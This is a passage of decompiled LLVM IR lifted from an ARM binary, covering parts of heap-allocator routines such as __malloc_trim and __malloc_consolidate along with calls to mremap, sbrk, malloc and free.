  store i32 %v3_16ab0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_16ad0 = call i32 @mremap(i32 %v2_16ac0, i32 %v2_16ac4, i32 %v3_16ab0, i32 1)
  store i32 %v4_16ad0, i32* %r0.global-to-local, align 4
  %v7_16ad4 = icmp eq i32 %v4_16ad0, -1
  br i1 %v7_16ad4, label %dec_label_pc_16b20, label %dec_label_pc_16adc

dec_label_pc_16adc:                               ; preds = %dec_label_pc_16ac0
  %v1_16adc = load i32, i32* @r4, align 4
  %v2_16adc = add i32 %v1_16adc, %v4_16ad0
  store i32 %v2_16adc, i32* %r0.global-to-local, align 4
  %v0_16ae0 = load i32, i32* @fp, align 4
  %v1_16ae0 = or i32 %v0_16ae0, 2
  store i32 %v1_16ae0, i32* %r3.global-to-local, align 4
  %v2_16ae4 = add i32 %v2_16adc, 4
  %v3_16ae4 = inttoptr i32 %v2_16ae4 to i32*
  store i32 %v1_16ae0, i32* %v3_16ae4, align 4
  %v0_16ae8 = load i32, i32* @r8, align 4
  %v1_16ae8 = add i32 %v0_16ae8, 868
  %v2_16ae8 = inttoptr i32 %v1_16ae8 to i32*
  %v3_16ae8 = load i32, i32* %v2_16ae8, align 4
  store i32 %v3_16ae8, i32* %r3.global-to-local, align 4
  %v1_16aec = add i32 %v0_16ae8, 880
  %v2_16aec = inttoptr i32 %v1_16aec to i32*
  %v3_16aec = load i32, i32* %v2_16aec, align 4
  store i32 %v3_16aec, i32* %r2.global-to-local, align 4
  %v0_16af0 = load i32, i32* @r6, align 4
  %v2_16af0 = sub i32 %v3_16ae8, %v0_16af0
  store i32 %v2_16af0, i32* %r3.global-to-local, align 4
  %v1_16af4 = load i32, i32* @r7, align 4
  %v2_16af4 = add i32 %v1_16af4, %v2_16af0
  store i32 %v2_16af4, i32* %r1.global-to-local, align 4
  %v1_16af8 = add i32 %v0_16ae8, 872
  %v2_16af8 = inttoptr i32 %v1_16af8 to i32*
  %v3_16af8 = load i32, i32* %v2_16af8, align 4
  store i32 %v3_16af8, i32* %r3.global-to-local, align 4
  %v1_16b00 = add i32 %v0_16ae8, 884
  %v2_16b00 = inttoptr i32 %v1_16b00 to i32*
  %v3_16b00 = load i32, i32* %v2_16b00, align 4
  store i32 %v3_16b00, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_16af4, %v3_16aec
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_16adc
  store i32 %v2_16af4, i32* %v2_16aec, align 4
  %v0_16b08.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_16b08.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_16adc, %bb33
  %v1_16b08 = phi i32 [ %v0_16ae8, %dec_label_pc_16adc ], [ %v1_16b08.pre, %bb33 ]
  %v0_16b08 = phi i32 [ %v2_16af4, %dec_label_pc_16adc ], [ %v0_16b08.pre, %bb33 ]
  %v2_16b08 = add i32 %v1_16b08, 868
  %v3_16b08 = inttoptr i32 %v2_16b08 to i32*
  store i32 %v0_16b08, i32* %v3_16b08, align 4
  %v0_16b0c = load i32, i32* %r1.global-to-local, align 4
  %v1_16b0c = load i32, i32* %r3.global-to-local, align 4
  %v2_16b0c = add i32 %v1_16b0c, %v0_16b0c
  store i32 %v2_16b0c, i32* %r1.global-to-local, align 4
  %v1_16b10 = load i32, i32* %r2.global-to-local, align 4
  %v0_16b14 = load i32, i32* %r0.global-to-local, align 4
  %v1_16b14 = add i32 %v0_16b14, 8
  store i32 %v1_16b14, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_16b0c, %v1_16b10
  br i1 %tmp43, label %bb35, label %dec_label_pc_16b58

bb35:                                             ; preds = %bb34
  %v5_16b18 = load i32, i32* @r8, align 4
  %v6_16b18 = add i32 %v5_16b18, 884
  %v7_16b18 = inttoptr i32 %v6_16b18 to i32*
  store i32 %v2_16b0c, i32* %v7_16b18, align 4
  br label %dec_label_pc_16b58

dec_label_pc_16b20:                               ; preds = %dec_label_pc_16ac0
  %v0_16b20 = load i32, i32* @sb, align 4
  %v1_16b20 = add i32 %v0_16b20, 4
  store i32 %v1_16b20, i32* %r3.global-to-local, align 4
  %v0_16b24 = load i32, i32* @r6, align 4
  %v3_16b24 = icmp ult i32 %v0_16b24, %v1_16b20
  br i1 %v3_16b24, label %dec_label_pc_16b34, label %dec_label_pc_16b20.dec_label_pc_16b2c_crit_edge

dec_label_pc_16b20.dec_label_pc_16b2c_crit_edge:  ; preds = %dec_label_pc_16b20
  %v0_16b2c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16b2c

dec_label_pc_16b2c:                               ; preds = %dec_label_pc_16b20.dec_label_pc_16b2c_crit_edge, %dec_label_pc_16a8c
  %v0_16b2c = phi i32 [ %v0_16b2c.pre, %dec_label_pc_16b20.dec_label_pc_16b2c_crit_edge ], [ %v0_16894, %dec_label_pc_16a8c ]
  store i32 %v0_16b2c, i32* @r4, align 4
  br label %dec_label_pc_16b58

dec_label_pc_16b34:                               ; preds = %dec_label_pc_16b20
  %v1_16b34 = add i32 %v0_16b20, -7
  store i32 %v1_16b34, i32* %r0.global-to-local, align 4
  %v1_16b38 = call i32 @malloc(i32 %v1_16b34)
  store i32 %v1_16b38, i32* @r0, align 4
  store i32 %v1_16b38, i32* @r4, align 4
  %v2_16b3c = icmp eq i32 %v1_16b38, 0
  br i1 %v2_16b3c, label %dec_label_pc_16b58, label %dec_label_pc_16b44

dec_label_pc_16b44:                               ; preds = %dec_label_pc_16b34
  %v0_16b44 = load i32, i32* @r6, align 4
  %v1_16b44 = add i32 %v0_16b44, -8
  store i32 %v1_16b44, i32* @r2, align 4
  %v0_16b48 = load i32, i32* @r5, align 4
  store i32 %v0_16b48, i32* @r1, align 4
  %v0_16b4c = call i32 @memcpy()
  %v0_16b50 = load i32, i32* @r5, align 4
  store i32 %v0_16b50, i32* @r0, align 4
  %v0_16b54 = call i32 @free()
  store i32 %v0_16b54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b58

dec_label_pc_16b58:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_16b34, %dec_label_pc_16b2c, %dec_label_pc_16a84, %.thread6, %dec_label_pc_168f4, %dec_label_pc_16b44
  store i32 %v2_16848, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  %v4_16b68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 24) to i32*), align 4
  store i32 %v4_16b68, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_16b68)
  br label %dec_label_pc_16b74

dec_label_pc_16b74:                               ; preds = %dec_label_pc_1687c, %dec_label_pc_16824, %dec_label_pc_1680c, %dec_label_pc_16b58
  %v0_16b74 = load i32, i32* @r4, align 4
  store i32 %v0_16b74, i32* %r0.global-to-local, align 4
  store i32 %v3_167ec, i32* @r4, align 4
  store i32 %v6_167ec, i32* @r5, align 4
  store i32 %v9_167ec, i32* @r6, align 4
  store i32 %v12_167ec, i32* @r7, align 4
  store i32 %v15_167ec, i32* @r8, align 4
  store i32 %v18_167ec, i32* @sb, align 4
  store i32 %v21_167ec, i32* @sl, align 4
  store i32 %v24_167ec, i32* @fp, align 4
  store i32 %v27_167ec, i32* @lr, align 4
  ret i32 %v0_16b74

; uselistorder directives
  uselistorder i32 %v2_16b0c, { 1, 0, 2 }
  uselistorder i32 %v2_16af4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16ad0, { 1, 0, 2 }
  uselistorder i32 %v3_16ab0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16a54, { 2, 1, 0 }
  uselistorder i32 %v2_16a24, { 1, 0, 2 }
  uselistorder i32 %v0_169b8, { 1, 0 }
  uselistorder i32 %v1_16974, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_168d8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_168d0, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_168b4, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_168ac, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_168a8, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_16898, { 1, 0 }
  uselistorder i32 %v0_16894, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_16874, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_16b74, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16b58, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_16a84, { 1, 0 }
  uselistorder label %dec_label_pc_16a24, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_16970, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16964, { 1, 0 }
  uselistorder label %dec_label_pc_16960, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_16b88(i32 %arg1) local_unnamed_addr {
dec_label_pc_16b88:
  %v0_16b88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16b88, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16b88
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16b88, %bb
  %v10_16b9c = phi i32 [ %arg1, %dec_label_pc_16b88 ], [ 0, %bb ]
  ret i32 %v10_16b9c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_16ba0 = add i32 %arg2, 44
  %v2_16ba0 = inttoptr i32 %v1_16ba0 to i32*
  %v3_16ba0 = load i32, i32* %v2_16ba0, align 4
  %v12_16ba4 = load i32, i32* @r7, align 4
  %v1_16ba8 = add i32 %v3_16ba0, 4
  %v2_16ba8 = inttoptr i32 %v1_16ba8 to i32*
  %v3_16ba8 = load i32, i32* %v2_16ba8, align 4
  %v1_16bac = add i32 %arg2, 860
  %v2_16bac = inttoptr i32 %v1_16bac to i32*
  %v3_16bac = load i32, i32* %v2_16bac, align 4
  store i32 %v3_16bac, i32* @r4, align 4
  %v1_16bb0 = and i32 %v3_16ba8, -4
  store i32 %v1_16bb0, i32* @r6, align 4
  %v1_16bb4 = add i32 %v1_16bb0, -17
  %v2_16bb8 = add i32 %v1_16bb4, %v3_16bac
  store i32 %arg2, i32* @r5, align 4
  %v2_16bc4 = sub i32 %v2_16bb8, %arg1
  store i32 %v3_16bac, i32* %r1.global-to-local, align 4
  %v2_16bcc = udiv i32 %v2_16bc4, %v3_16bac
  %v1_16bd0 = add i32 %v2_16bcc, -1
  store i32 %v1_16bd0, i32* %r0.global-to-local, align 4
  %v2_16bd4 = mul i32 %v1_16bd0, %v3_16bac
  store i32 %v2_16bd4, i32* @r7, align 4
  %v2_16bd8 = icmp eq i32 %v2_16bd4, 0
  store i1 %v2_16bd8, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_16bd4, 1
  br i1 %tmp8, label %dec_label_pc_16c40, label %dec_label_pc_16be0

dec_label_pc_16be0:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16be4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16be4, i32* %r0.global-to-local, align 4
  %v0_16be8 = load i32, i32* @r5, align 4
  %v1_16be8 = add i32 %v0_16be8, 44
  %v2_16be8 = inttoptr i32 %v1_16be8 to i32*
  %v3_16be8 = load i32, i32* %v2_16be8, align 4
  %v0_16bec = load i32, i32* @r6, align 4
  %v2_16bec = add i32 %v0_16bec, %v3_16be8
  %v9_16bf0 = icmp eq i32 %v1_16be4, %v2_16bec
  store i1 %v9_16bf0, i1* @cpsr_z, align 1
  store i32 %v1_16be4, i32* @r4, align 4
  br i1 %v9_16bf0, label %dec_label_pc_16bfc, label %dec_label_pc_16c40

dec_label_pc_16bfc:                               ; preds = %dec_label_pc_16be0
  %v0_16bfc = load i32, i32* @r7, align 4
  %v1_16bfc = sub i32 0, %v0_16bfc
  store i32 %v1_16bfc, i32* %r0.global-to-local, align 4
  %v1_16c00 = call i32 @__GI_sbrk(i32 %v1_16bfc)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16c08 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16c08, i32* %r0.global-to-local, align 4
  %v7_16c0c = icmp eq i32 %v1_16c08, -1
  store i1 %v7_16c0c, i1* @cpsr_z, align 1
  br i1 %v7_16c0c, label %dec_label_pc_16c40, label %dec_label_pc_16c14

dec_label_pc_16c14:                               ; preds = %dec_label_pc_16bfc
  %v0_16c14 = load i32, i32* @r4, align 4
  %v2_16c14 = sub i32 %v0_16c14, %v1_16c08
  store i32 %v2_16c14, i32* %r0.global-to-local, align 4
  %v9_16c14 = icmp eq i32 %v0_16c14, %v1_16c08
  store i1 %v9_16c14, i1* @cpsr_z, align 1
  br i1 %v9_16c14, label %dec_label_pc_16c40, label %dec_label_pc_16c1c

dec_label_pc_16c1c:                               ; preds = %dec_label_pc_16c14
  %v0_16c1c = load i32, i32* @r5, align 4
  %v1_16c1c = add i32 %v0_16c1c, 872
  %v2_16c1c = inttoptr i32 %v1_16c1c to i32*
  %v3_16c1c = load i32, i32* %v2_16c1c, align 4
  %v1_16c20 = load i32, i32* @r6, align 4
  %v2_16c20 = sub i32 %v1_16c20, %v2_16c14
  %v1_16c24 = add i32 %v0_16c1c, 44
  %v2_16c24 = inttoptr i32 %v1_16c24 to i32*
  %v3_16c24 = load i32, i32* %v2_16c24, align 4
  store i32 %v3_16c24, i32* %r1.global-to-local, align 4
  %v2_16c28 = sub i32 %v3_16c1c, %v2_16c14
  %v1_16c2c = or i32 %v2_16c20, 1
  store i32 %v1_16c2c, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_16c28, i32* %v2_16c1c, align 4
  %v0_16c38 = load i32, i32* @r2, align 4
  %v1_16c38 = load i32, i32* %r1.global-to-local, align 4
  %v2_16c38 = add i32 %v1_16c38, 4
  %v3_16c38 = inttoptr i32 %v2_16c38 to i32*
  store i32 %v0_16c38, i32* %v3_16c38, align 4
  %v1_16c4c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16c44

dec_label_pc_16c40:                               ; preds = %dec_label_pc_16be0, %dec_label_pc_16c14, %dec_label_pc_16bfc, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16c44

dec_label_pc_16c44:                               ; preds = %dec_label_pc_16c1c, %dec_label_pc_16c40
  %v1_16c4c = phi i32 [ %v1_16c4c.pre, %dec_label_pc_16c1c ], [ 0, %dec_label_pc_16c40 ]
  store i32 %v12_16ba4, i32* @r7, align 4
  ret i32 %v1_16c4c

; uselistorder directives
  uselistorder i1 %v7_16c0c, { 1, 0 }
  uselistorder i32 %v1_16c08, { 2, 1, 0, 3 }
  uselistorder i32 %v3_16bac, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16c44, { 1, 0 }
  uselistorder label %dec_label_pc_16c40, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16c50 = load i32, i32* @r4, align 4
  store i32 %v3_16c50, i32* %stack_var_-36, align 4
  %v0_16c54 = load i32, i32* @r0, align 4
  %v1_16c54 = inttoptr i32 %v0_16c54 to i32*
  %v2_16c54 = load i32, i32* %v1_16c54, align 4
  store i32 %v2_16c54, i32* %r3.global-to-local, align 4
  %v2_16c58 = icmp eq i32 %v2_16c54, 0
  store i32 %v0_16c54, i32* @r4, align 4
  br i1 %v2_16c58, label %dec_label_pc_16d90.preheader, label %dec_label_pc_16c6c

dec_label_pc_16d90.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_16d9825 = add i32 %v0_16c54, 52
  store i32 %v1_16d9825, i32* %r3.global-to-local, align 4
  %v2_16da026 = add i32 %v0_16c54, 60
  %v3_16da027 = inttoptr i32 %v2_16da026 to i32*
  store i32 %v1_16d9825, i32* %v3_16da027, align 4
  %v0_16da428 = load i32, i32* %r3.global-to-local, align 4
  %v2_16da429 = add i32 %v0_16da428, 12
  %v3_16da430 = inttoptr i32 %v2_16da429 to i32*
  store i32 %v0_16da428, i32* %v3_16da430, align 4
  br label %dec_label_pc_16d90.dec_label_pc_16d90_crit_edge

dec_label_pc_16c6c:                               ; preds = %entry
  %v1_16c6c = and i32 %v2_16c54, -3
  %v3_16c70 = udiv i32 %v2_16c54, 8
  store i32 %v3_16c70, i32* @r2, align 4
  store i32 %v1_16c6c, i32* %v1_16c54, align 4
  %v0_16c78 = load i32, i32* @r0, align 4
  %v1_16c78 = add i32 %v0_16c78, -4
  store i32 %v1_16c78, i32* %r3.global-to-local, align 4
  %v1_16c7c = load i32, i32* @r2, align 4
  %v4_16c7c = mul i32 %v1_16c7c, 4
  %v5_16c7c = add i32 %v4_16c7c, %v1_16c78
  store i32 %v5_16c7c, i32* %sb.global-to-local, align 4
  %v1_16c80 = add i32 %v0_16c78, 52
  store i32 %v1_16c80, i32* %r7.global-to-local, align 4
  %v1_16c84 = add i32 %v0_16c78, 4
  store i32 %v1_16c84, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_16c8c

dec_label_pc_16c8c:                               ; preds = %dec_label_pc_16d88, %dec_label_pc_16c6c
  %v1_16d8010 = phi i32 [ %v1_16d80, %dec_label_pc_16d88 ], [ %v5_16c7c, %dec_label_pc_16c6c ]
  %v1_16c98 = phi i32 [ %v1_16d88, %dec_label_pc_16d88 ], [ %v1_16c84, %dec_label_pc_16c6c ]
  %v1_16c8c = inttoptr i32 %v1_16c98 to i32*
  %v2_16c8c = load i32, i32* %v1_16c8c, align 4
  store i32 %v2_16c8c, i32* %r1.global-to-local, align 4
  %v2_16c90 = icmp eq i32 %v2_16c8c, 0
  br i1 %v2_16c90, label %dec_label_pc_16d80, label %dec_label_pc_16c98

dec_label_pc_16c98:                               ; preds = %dec_label_pc_16c8c
  %v0_16c98 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16c98, i32* %v1_16c8c, align 4
  %v0_16c9c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c9c

dec_label_pc_16c9c:                               ; preds = %dec_label_pc_16d74, %dec_label_pc_16c98
  %v0_16cb8 = phi i32 [ %v0_16d74, %dec_label_pc_16d74 ], [ %v0_16c9c.pre, %dec_label_pc_16c98 ]
  %v1_16c9c = add i32 %v0_16cb8, 4
  %v2_16c9c = inttoptr i32 %v1_16c9c to i32*
  %v3_16c9c = load i32, i32* %v2_16c9c, align 4
  store i32 %v3_16c9c, i32* %r3.global-to-local, align 4
  %v1_16ca0 = and i32 %v3_16c9c, -2
  store i32 %v1_16ca0, i32* %lr.global-to-local, align 4
  %v2_16ca4 = add i32 %v1_16ca0, %v0_16cb8
  store i32 %v2_16ca4, i32* @r0, align 4
  %v1_16ca8 = urem i32 %v3_16c9c, 2
  %v2_16ca8 = icmp eq i32 %v1_16ca8, 0
  %v1_16cac = add i32 %v0_16cb8, 8
  %v2_16cac = inttoptr i32 %v1_16cac to i32*
  %v3_16cac = load i32, i32* %v2_16cac, align 4
  store i32 %v3_16cac, i32* %sl.global-to-local, align 4
  %v1_16cb0 = add i32 %v2_16ca4, 4
  %v2_16cb0 = inttoptr i32 %v1_16cb0 to i32*
  %v3_16cb0 = load i32, i32* %v2_16cb0, align 4
  store i32 %v3_16cb0, i32* %r8.global-to-local, align 4
  br i1 %v2_16ca8, label %dec_label_pc_16cb8, label %dec_label_pc_16cec

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16c9c
  %v1_16cb8 = inttoptr i32 %v0_16cb8 to i32*
  %v2_16cb8 = load i32, i32* %v1_16cb8, align 4
  store i32 %v2_16cb8, i32* %r5.global-to-local, align 4
  %v2_16cbc = sub i32 %v0_16cb8, %v2_16cb8
  store i32 %v2_16cbc, i32* %r3.global-to-local, align 4
  %v1_16cc0 = add i32 %v2_16cbc, 8
  %v2_16cc0 = inttoptr i32 %v1_16cc0 to i32*
  %v3_16cc0 = load i32, i32* %v2_16cc0, align 4
  store i32 %v3_16cc0, i32* @ip, align 4
  %v1_16cc4 = add i32 %v3_16cc0, 12
  %v2_16cc4 = inttoptr i32 %v1_16cc4 to i32*
  %v3_16cc4 = load i32, i32* %v2_16cc4, align 4
  store i32 %v3_16cc4, i32* %r1.global-to-local, align 4
  %v9_16cc8 = icmp eq i32 %v3_16cc4, %v2_16cbc
  %v1_16ccc = add i32 %v2_16cbc, 12
  %v2_16ccc = inttoptr i32 %v1_16ccc to i32*
  %v3_16ccc = load i32, i32* %v2_16ccc, align 4
  store i32 %v3_16ccc, i32* @r2, align 4
  br i1 %v9_16cc8, label %dec_label_pc_16cd4, label %dec_label_pc_16d30

dec_label_pc_16cd4:                               ; preds = %dec_label_pc_16cb8
  %v1_16cd4 = add i32 %v3_16ccc, 8
  %v2_16cd4 = inttoptr i32 %v1_16cd4 to i32*
  %v3_16cd4 = load i32, i32* %v2_16cd4, align 4
  store i32 %v3_16cd4, i32* %r3.global-to-local, align 4
  %v9_16cd8 = icmp eq i32 %v3_16cd4, %v2_16cbc
  br i1 %v9_16cd8, label %dec_label_pc_16ce0, label %dec_label_pc_16d30

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16cd4
  store i32 %v3_16cc0, i32* %v2_16cd4, align 4
  %v0_16ce4 = load i32, i32* @r2, align 4
  %v1_16ce4 = load i32, i32* @ip, align 4
  %v2_16ce4 = add i32 %v1_16ce4, 12
  %v3_16ce4 = inttoptr i32 %v2_16ce4 to i32*
  store i32 %v0_16ce4, i32* %v3_16ce4, align 4
  %v0_16ce8 = load i32, i32* %lr.global-to-local, align 4
  %v1_16ce8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16ce8 = add i32 %v1_16ce8, %v0_16ce8
  store i32 %v2_16ce8, i32* %lr.global-to-local, align 4
  %v0_16cf0.pre = load i32, i32* @r0, align 4
  %v0_16cf4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16cec

dec_label_pc_16cec:                               ; preds = %dec_label_pc_16c9c, %dec_label_pc_16ce0
  %v0_16d64 = phi i32 [ %v1_16ca0, %dec_label_pc_16c9c ], [ %v2_16ce8, %dec_label_pc_16ce0 ]
  %v0_16cf4 = phi i32 [ %v3_16cb0, %dec_label_pc_16c9c ], [ %v0_16cf4.pre, %dec_label_pc_16ce0 ]
  %v1_16d08 = phi i32 [ %v2_16ca4, %dec_label_pc_16c9c ], [ %v0_16cf0.pre, %dec_label_pc_16ce0 ]
  %v0_16cec = load i32, i32* @r4, align 4
  %v1_16cec = add i32 %v0_16cec, 44
  %v2_16cec = inttoptr i32 %v1_16cec to i32*
  %v3_16cec = load i32, i32* %v2_16cec, align 4
  store i32 %v3_16cec, i32* %r3.global-to-local, align 4
  %v9_16cf0 = icmp eq i32 %v1_16d08, %v3_16cec
  %v1_16cf4 = and i32 %v0_16cf4, -4
  store i32 %v1_16cf4, i32* %r5.global-to-local, align 4
  br i1 %v9_16cf0, label %dec_label_pc_16d64, label %dec_label_pc_16cfc

dec_label_pc_16cfc:                               ; preds = %dec_label_pc_16cec
  %v2_16cfc = add i32 %v1_16d08, %v1_16cf4
  store i32 %v2_16cfc, i32* %r3.global-to-local, align 4
  %v1_16d00 = add i32 %v2_16cfc, 4
  %v2_16d00 = inttoptr i32 %v1_16d00 to i32*
  %v3_16d00 = load i32, i32* %v2_16d00, align 4
  store i32 %v3_16d00, i32* %r3.global-to-local, align 4
  %v1_16d04 = urem i32 %v3_16d00, 2
  %v2_16d04 = icmp eq i32 %v1_16d04, 0
  %v2_16d08 = add i32 %v1_16d08, 4
  %v3_16d08 = inttoptr i32 %v2_16d08 to i32*
  store i32 %v1_16cf4, i32* %v3_16d08, align 4
  br i1 %v2_16d04, label %dec_label_pc_16d10, label %dec_label_pc_16cfc.dec_label_pc_16d40_crit_edge

dec_label_pc_16cfc.dec_label_pc_16d40_crit_edge:  ; preds = %dec_label_pc_16cfc
  %v0_16d44.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_16d40

dec_label_pc_16d10:                               ; preds = %dec_label_pc_16cfc
  %v0_16d10 = load i32, i32* @r0, align 4
  %v1_16d10 = add i32 %v0_16d10, 8
  %v2_16d10 = inttoptr i32 %v1_16d10 to i32*
  %v3_16d10 = load i32, i32* %v2_16d10, align 4
  store i32 %v3_16d10, i32* @ip, align 4
  %v1_16d14 = add i32 %v3_16d10, 12
  %v2_16d14 = inttoptr i32 %v1_16d14 to i32*
  %v3_16d14 = load i32, i32* %v2_16d14, align 4
  store i32 %v3_16d14, i32* %r3.global-to-local, align 4
  %v9_16d18 = icmp eq i32 %v3_16d14, %v0_16d10
  %v1_16d1c = add i32 %v0_16d10, 12
  %v2_16d1c = inttoptr i32 %v1_16d1c to i32*
  %v3_16d1c = load i32, i32* %v2_16d1c, align 4
  store i32 %v3_16d1c, i32* %r2.global-to-local, align 4
  br i1 %v9_16d18, label %dec_label_pc_16d24, label %dec_label_pc_16d30

dec_label_pc_16d24:                               ; preds = %dec_label_pc_16d10
  %v1_16d24 = add i32 %v3_16d1c, 8
  %v2_16d24 = inttoptr i32 %v1_16d24 to i32*
  %v3_16d24 = load i32, i32* %v2_16d24, align 4
  store i32 %v3_16d24, i32* %r3.global-to-local, align 4
  %v9_16d28 = icmp eq i32 %v3_16d24, %v0_16d10
  br i1 %v9_16d28, label %dec_label_pc_16d34, label %dec_label_pc_16d30

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16d10, %dec_label_pc_16cd4, %dec_label_pc_16cb8, %dec_label_pc_16d24
  %v0_16d30 = call i32 @abort()
  store i32 %v0_16d30, i32* @r0, align 4
  %v0_16d34.pre = load i32, i32* @ip, align 4
  %v1_16d34.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16d34

dec_label_pc_16d34:                               ; preds = %dec_label_pc_16d24, %dec_label_pc_16d30
  %v1_16d34 = phi i32 [ %v3_16d1c, %dec_label_pc_16d24 ], [ %v1_16d34.pre, %dec_label_pc_16d30 ]
  %v0_16d34 = phi i32 [ %v3_16d10, %dec_label_pc_16d24 ], [ %v0_16d34.pre, %dec_label_pc_16d30 ]
  %v2_16d34 = add i32 %v1_16d34, 8
  %v3_16d34 = inttoptr i32 %v2_16d34 to i32*
  store i32 %v0_16d34, i32* %v3_16d34, align 4
  %v0_16d38 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d38 = load i32, i32* @ip, align 4
  %v2_16d38 = add i32 %v1_16d38, 12
  %v3_16d38 = inttoptr i32 %v2_16d38 to i32*
  store i32 %v0_16d38, i32* %v3_16d38, align 4
  %v0_16d3c = load i32, i32* %lr.global-to-local, align 4
  %v1_16d3c = load i32, i32* %r5.global-to-local, align 4
  %v2_16d3c = add i32 %v1_16d3c, %v0_16d3c
  store i32 %v2_16d3c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_16d40

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16cfc.dec_label_pc_16d40_crit_edge, %dec_label_pc_16d34
  %v0_16d44 = phi i32 [ %v0_16d44.pre, %dec_label_pc_16cfc.dec_label_pc_16d40_crit_edge ], [ %v2_16d3c, %dec_label_pc_16d34 ]
  %v0_16d40 = load i32, i32* %r7.global-to-local, align 4
  %v1_16d40 = add i32 %v0_16d40, 8
